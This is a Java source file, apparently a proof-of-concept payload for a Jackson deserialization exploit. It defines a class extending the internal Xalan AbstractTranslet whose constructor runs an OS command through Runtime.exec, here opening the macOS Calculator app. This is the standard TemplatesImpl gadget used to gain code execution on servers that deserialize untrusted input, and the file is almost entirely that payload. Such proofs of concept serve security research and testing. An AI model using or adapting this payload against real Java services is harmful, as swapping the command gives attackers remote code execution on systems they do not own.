package jackson;

/**
 * Created by liaoxinxi on 2017-6-15.
 */

/**
 * Created by liaoxinxi on 2017-4-18.
 */
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    //@Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        
    }


}
